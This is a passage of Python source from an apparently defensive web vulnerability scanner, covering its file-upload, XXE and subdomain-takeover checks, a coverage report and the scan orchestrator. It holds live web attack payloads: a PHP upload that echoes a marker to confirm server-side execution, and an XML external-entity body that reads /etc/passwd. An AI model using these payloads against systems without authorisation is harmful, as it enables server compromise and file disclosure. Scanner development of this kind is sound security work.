                          "Debug/Infrastructure Exposure", root + path,
                          "A development, diagnostics, or dependency-manifest endpoint is publicly served.",
                          "Disable in production; bind to localhost; gate behind auth/IP allow-list.", "CWE-489",
                          rx.search(r.text).group(0)[:80]))
    return out


async def bat_upload(cfg, client, budget, crawl: CrawlResult) -> list[Finding]:
    """Acceptance and execution are DIFFERENT findings:
      • accepted benign upload + accepted .php-looking name → potential
        validation problem (high)
      • uploaded file later SERVES its content (marker echoed back) →
        verified server-side execution (critical)"""
    out: list[Finding] = []
    for form in [f for f in crawl.forms if any(x.ftype == "file" for x in f.fields)][:MAX_UPLOAD_PROBES]:
        if origin_of(form.action) != origin_of(cfg.url):
            continue

        async def _upload(name: str, content: bytes, ctype: str):
            return await _bpost(client, budget, form.action,
                                files={"file": (name, content, ctype)})

        r = await _upload("fsafe-probe.txt", b"fsafe benign upload probe", "text/plain")
        if not (r and r.status_code in (200, 201)) \
                or not re.search(r"(upload(ed)?|saved|stored)", (r.text or ""), re.I) \
                or re.search(r"(error|invalid|not allowed|forbidden|denied)", (r.text or ""), re.I):
            continue

        # find where uploads land (response path or conventional /uploads/)
        m = re.search(r"([\w./:-]*uploads?[\w./:-]*\.(?:php|txt|html))", (r.text or ""), re.I)
        r2 = await _upload("fsafe-probe.php", b"<?php echo 'fsafemarker'; ?>", "application/x-php")
        if not (r2 and r2.status_code in (200, 201)) \
                or re.search(r"(error|invalid|not allowed|forbidden|denied)", (r2.text or ""), re.I):
            out.append(_f("File upload accepts arbitrary files without validation errors", "high",
                          "File Upload", form.action,
                          "Upload endpoint accepted files without apparent content/extension validation.",
                          "Allow-list extensions+MIME, randomize storage names, serve from a separate origin.",
                          "CWE-434", (r.text or "")[:120], confidence="medium"))
            continue

        m2 = re.search(r"([\w./:-]*uploads?[\w./:-]*fsafe-probe\.php)", (r2.text or ""), re.I)
        path = (m2 or m).group(1) if (m2 or m) else "/uploads/fsafe-probe.php"
        r3 = await _bget(client, budget, urlsplit(form.action).scheme + "://"
                         + urlsplit(form.action).netloc + ("/" + path.lstrip("/") if not path.startswith("/") else path))
        if r3 and "fsafemarker" in (r3.text or ""):
            out.append(_f("Uploaded file EXECUTES server-side (verified RCE)", "critical",
                          "File Upload/RCE", form.action,
                          "A .php upload was accepted AND its code runs when the file is requested — full server compromise.",
                          "Never execute uploads; store outside webroot on a non-executing origin; validate aggressively.",
                          "CWE-434", "marker echoed from uploaded file"))
        else:
            out.append(_f("Executable-looking upload accepted (execution not verified)", "high",
                          "File Upload", form.action,
                          "The server accepted a .php upload. Execution could not be verified — treat as a serious "
                          "validation gap until proven safe.",
                          "Reject executable extensions; verify with your own payload placement test.", "CWE-434",
                          (r2.text or "")[:120], confidence="medium"))
    return out


async def bat_xxe(cfg, client, budget, crawl: CrawlResult) -> list[Finding]:
    out: list[Finding] = []
    xml_pages = [p for p in crawl.pages if "xml" in (p.headers.get("content-type") or "").lower()][:3]
    for p in xml_pages:
        body = ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                "<r>&xxe;</r>")
        r = await _bpost(client, budget, p.url, content=body,
                         headers={"Content-Type": "application/xml"})
        if r and TRAVERSAL_EVIDENCE.search(r.text or ""):
            out.append(_f("XML External Entity (XXE): file read", "critical", "XXE", p.url,
                          "The XML parser resolves external entities — arbitrary file read / SSRF.",
                          "Disable DTDs/external entities; use parser hardening flags.", "CWE-611",
                          TRAVERSAL_EVIDENCE.search(r.text).group(0)))
        elif r and re.search(r"(entity|dtd|doctype)", (r.text or ""), re.I) and r.status_code >= 400:
            out.append(_f("XML parser processes DOCTYPE (XXE possible)", "medium", "XXE", p.url,
                          "Parser errors reference entities/doctype — external entities may resolve.",
                          "Disable DTD processing.", "CWE-611", (r.text or "")[:120], confidence="low"))
    return out


# ------------------------------------------------------------ battery 19 takeover

async def bat_takeover(cfg: ScanConfig, recon: dict, log) -> list[Finding]:
    """Subdomains discovered via DNS/CT are reported as INFORMATION — the
    scanner never auto-fetches them. Active probing requires the explicit
    consent flag (cfg.brutal_probe_subdomains), because those hosts are
    resolved *from* the target's DNS but are not the target origin itself."""
    out: list[Finding] = []
    subs = (recon or {}).get("subdomains") or []
    if subs:
        out.append(_f("Discovered subdomains (out-of-scope DNS information)", "info", "Recon",
                      cfg.url,
                      f"{len(subs)} subdomain(s) found via certificate-transparency/DNS: "
                      f"{', '.join(subs[:8])}{'…' if len(subs) > 8 else ''}. These are NOT probed automatically. "
                      "Check each for dangling DNS records (S3/GitHub/Azure/Heroku/Fastly unclaimed pages) manually "
                      "or enable brutal subdomain probing explicitly.",
                      "Verify every DNS record resolves to a resource you control; delete dangling records.", "CWE-350"))

    if not getattr(cfg, "brutal_probe_subdomains", False):
        return out

    # explicit consent path — fetch each subdomain's root once, fingerprint takeover pages
    log(f"brutal: subdomain probing ENABLED (explicit consent) — {min(len(subs), 20)} host(s)")
    async with httpx.AsyncClient(trust_env=False, timeout=8, follow_redirects=True,
                                 headers={"User-Agent": "FSafe-Scanner/1.0"}) as ac:
        for sub in subs[:20]:
            try:
                r = await ac.get(f"https://{sub}", timeout=8)
            except httpx.HTTPError:
                continue
            for svc, rx, sev in TAKEOVER_FPS:
                if rx.search(r.text or ""):
                    out.append(_f(f"Possible subdomain takeover: {sub} ({svc})", sev,
                                  "Subdomain Takeover", f"https://{sub}",
                                  f"The subdomain serves {svc}'s unclaimed-resource page — an attacker can claim it.",
                                  "Remove the dangling DNS record or re-claim the resource at the provider.", "CWE-350",
                                  rx.search(r.text).group(0)[:80], confidence="medium"))
                    break
    return out


# ------------------------------------------------------------ battery 20 coverage

MANUAL_REQUIRED = [
    "Stored XSS (needs persistence + second session)",
    "Second-order SQLi (payload stored, consumed later)",
    "Race conditions / TOCTOU (needs synchronized double-spends)",
    "Business logic: price, coupon, quantity, workflow, refund abuse",
    "OAuth / SAML flows and account-linking flaws",
    "MFA bypass, OTP weaknesses, MFA fatigue",
    "Password-reset abuse and token prediction",
    "Verified IDOR / BOLA / tenant isolation (needs 2+ controlled accounts)",
    "Mass assignment / over-posting (needs API schema knowledge)",
    "Deserialization gadget chains (needs stack knowledge)",
    "Memory corruption (buffer/heap/integer, use-after-free)",
    "Cloud IAM, Kubernetes, container escape audit",
    "CI/CD pipelines, dependency confusion, supply chain",
    "Backup/export review, log review, monitoring validation",
    "WebSocket per-message authz (needs interactive client)",
    "CSRF exploitation with a real victim session",
    "GraphQL depth/complexity abuse beyond introspection",
]


def _coverage_finding(spent: int, attempted: int) -> Finding:
    automated = ("SQLi (error/boolean/time/union) · NoSQL · LDAP · XPath · OS command · SSTI/code · "
                 "traversal/LFI · RFI signals · SSRF (+canary blind) · XXE · request smuggling · cache "
                 "headers · CORS · DOM XSS · auth (enumeration/rate-limit/default creds) · JWT signals · "
                 "unauthenticated object endpoints · IDOR signals · GraphQL introspection · API data "
                 "exposure · pagination · method override · debug surface · file upload (acceptance AND "
                 "verified execution) · subdomain info (no auto-fetch)")
    checklist = "\n".join(f"  ! {item}" for item in MANUAL_REQUIRED)
    return _f(
        "Brutal coverage report — automated ✓ / manual-required !", "info", "Brutal Coverage",
        "", f"Automated battery spent {spent} request(s) across {attempted} battery group(s).\n\n"
        f"AUTOMATED (evidence-based findings above):\n  ✓ {automated}\n\n"
        f"MANUAL REQUIRED (cannot be automated safely — do these by hand):\n{checklist}",
        "Work the manual list with real accounts, business context, and an interactive proxy. "
        "An empty automated result is NOT 'zero vulnerabilities' — it means automation found nothing.",
        "CWE-693", "")


# ---------------------------------------------------------------- orchestrator

async def run_brutal(cfg: ScanConfig, client: RateLimitedClient, crawl: CrawlResult,
                     recon: dict, stats, log, progress_cb=None) -> list[Finding]:
    scope = origin_of(cfg.url)
    params = [(u, p) for u, p in crawl.get_params if origin_of(u) == scope]
    for fd in crawl.forms:
        if fd.method == "GET" and origin_of(fd.action) == scope:
            for fld in fd.fields[:4]:
                params.append((fd.action, fld.name))
    seen: set = set()
    uniq: list = []
    for u, p in params:
        k = (u.split("?")[0], p)
        if k not in seen:
            seen.add(k)
            uniq.append((u, p))
    params = uniq[:80]

    budget = _Budget(BRUTAL_BUDGET)
    base: dict = {}

    async def baselines():
        paths = list(dict.fromkeys(u.split("?")[0] for u, _ in params))[:30]
        for i, path in enumerate(paths):
            t0 = time.perf_counter()
            r = await _bget(client, budget, path)
            base[path] = (r.status_code if r else 0, time.perf_counter() - t0)
            if progress_cb and i % 5 == 0:
                await progress_cb(f"brutal: baselines {i}/{len(paths)}")

    log(f"brutal mode engaged: {len(params)} param target(s), hard budget {BRUTAL_BUDGET} requests")
    out: list[Finding] = []
    await baselines()

    steps: list[tuple[str, object]] = [
        ("01 SQLi error/boolean/time", lambda: bat_sqli(cfg, client, budget, params, base, log)),
        ("02 UNION SQLi", lambda: bat_union_sqli(cfg, client, budget, params)),
        ("03 NoSQL/LDAP/XPath/cmd/SSTI", lambda: bat_injection_families(cfg, client, budget, params, base)),
        ("04 traversal/LFI/RFI", lambda: bat_traversal(cfg, client, budget, params)),
        ("05 SSRF", lambda: bat_ssrf(cfg, client, budget, params)),
        ("06 smuggling", lambda: bat_smuggling(cfg, client, budget)),
        ("07 cache/header", lambda: bat_cache(cfg, client, budget)),
        ("08 CORS", lambda: bat_cors(cfg, client, budget)),
        ("09 DOM XSS", lambda: bat_dom_xss(cfg, client, budget, crawl)),
        ("10 auth battery", lambda: bat_auth(cfg, client, budget, crawl)),
        ("11 IDOR/access", lambda: bat_idor(cfg, client, budget, crawl)),
        ("12 API security", lambda: bat_api(cfg, client, budget, crawl)),
        ("13 debug surface", lambda: bat_debug(cfg, client, budget)),
        ("14 file upload", lambda: bat_upload(cfg, client, budget, crawl)),
        ("15 XXE", lambda: bat_xxe(cfg, client, budget, crawl)),
    ]
    attempted = 0
    for name, run_family in steps:
        if budget.exhausted:
            log("brutal: hard request budget reached — remaining batteries skipped (see coverage finding)")
            break
        attempted += 1
        if progress_cb:
            await progress_cb(f"brutal: {name}")
        try:
            got = await run_family()
        except Exception as e:  # a battery must never kill the scan
            log(f"brutal: battery '{name}' errored: {type(e).__name__}: {e}")
            got = []
        log(f"brutal[{name}] → {len(got)} finding(s)")
        out.extend(got)

    out.extend(bat_jwt_session(cfg, crawl))
    try:
        out.extend(await bat_takeover(cfg, recon or {}, log))
    except Exception as e:
        log(f"brutal: takeover battery errored: {e}")
    out.append(_coverage_finding(budget.spent, attempted))
    stats.requests = client.requests_sent
    log(f"brutal complete: {len(out) - 1} finding(s), {budget.spent} requests spent (hard cap {BRUTAL_BUDGET})")
    return out
